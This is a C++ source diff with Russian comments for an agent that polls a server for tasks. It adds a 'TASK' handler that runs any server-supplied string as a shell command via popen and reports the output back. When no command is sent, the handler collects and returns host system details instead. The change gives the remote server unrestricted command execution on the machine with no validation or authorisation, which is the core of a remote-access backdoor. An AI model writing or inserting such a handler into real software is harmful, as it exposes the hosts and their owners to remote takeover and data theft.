@@ -5,6 +5,38 @@
 #include <iostream>
 #include <thread>
 #include <fstream>
+#include <cstdio>
+#include <memory>
+#include <array>
+#include <sys/utsname.h>
+
+// Вспомогательная функция для выполнения команды и получения stdout
+static std::string execute_command(const std::string& cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
+    if (!pipe) {
+        return "Ошибка выполнения команды";
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
+// Получение системной информации (ОС, версия ядра, имя хоста, архитектура)
+static std::string get_system_info() {
+    struct utsname info;
+    if (uname(&info) != 0) {
+        return "Не удалось получить системную информацию";
+    }
+    std::string result = "OS: " + std::string(info.sysname) + "\n";
+    result += "Hostname: " + std::string(info.nodename) + "\n";
+    result += "Release: " + std::string(info.release) + "\n";
+    result += "Version: " + std::string(info.version) + "\n";
+    result += "Machine: " + std::string(info.machine) + "\n";
+    return result;
+}
 
 // POST /api/wa_task/
 // возвращает: 1 = задание есть, 0 = ждём, -2 = неверный код, -99 = ошибка
@@ -63,7 +95,7 @@ static int request_task(Task& out_task) {
 static int parse_interval_from_options(const std::string& options) {
     if (options.empty()) return -1;
 
-    // пробуем парсить как JSON: {"interval":"15"}
+    // 1. Пробуем парсить как JSON: {"interval":"15"}
     auto interval_str = Json::get(options, "interval");
     if (interval_str) {
         try {
@@ -71,7 +103,25 @@ static int parse_interval_from_options(const std::string& options) {
         } catch (...) {}
     }
 
-    // пробуем парсить как простой текст: {POLL_INTERVAL_SEC = 15}
+    // 2. Пробуем парсить как простое число (все символы цифры, возможно минус)
+    std::string trimmed = options;
+    trimmed.erase(0, trimmed.find_first_not_of(" \t\n\r"));
+    trimmed.erase(trimmed.find_last_not_of(" \t\n\r") + 1);
+    bool all_digits = !trimmed.empty();
+    for (char c : trimmed) {
+        if (c != '-' && !isdigit(c)) {
+            all_digits = false;
+            break;
+        }
+    }
+    if (all_digits) {
+        try {
+            int val = std::stoi(trimmed);
+            if (val > 0) return val;
+        } catch (...) {}
+    }
+
+    // 3. Пробуем парсить как простой текст: {POLL_INTERVAL_SEC = 15}
     size_t pos = options.find("POLL_INTERVAL_SEC");
     if (pos != std::string::npos) {
         size_t eq = options.find("=", pos);
@@ -174,12 +224,36 @@ static void handle_timeout(const Task& task) {
     send_result(task.session_id, 0, "таймаут выполнен", {});
 }
 
+// обработка задания типа TASK
+static void handle_task(const Task& task) {
+    Logger::info("[TASK] Выполнение, session=" + task.session_id);
+
+    std::string result_message;
+
+    if (!task.options.empty()) {
+        // Если options не пуст, интерпретируем как команду
+        Logger::info("[TASK] Выполняем команду: " + task.options);
+        result_message = execute_command(task.options);
+        if (result_message.empty()) {
+            result_message = "Команда выполнена, вывод отсутствует.";
+        }
+        Logger::info("[TASK] Команда завершена, отправляем результат");
+    } else {
+        // Иначе возвращаем системную информацию
+        Logger::info("[TASK] Сбор системной информации");
+        result_message = get_system_info();
+    }
+
+    send_result(task.session_id, 0, result_message, {});
+}
+
 // диспетчер - по task_code выбираем обработчик
 using TaskHandler = std::function<void(const Task&)>;
 static const std::map<std::string, TaskHandler> HANDLERS = {
     { "CONF", handle_conf },
     { "FILE", handle_file },
     { "TIMEOUT", handle_timeout },
+    { "TASK", handle_task }   // добавлен новый обработчик
 };
 
 static void execute_task(const Task& task) {
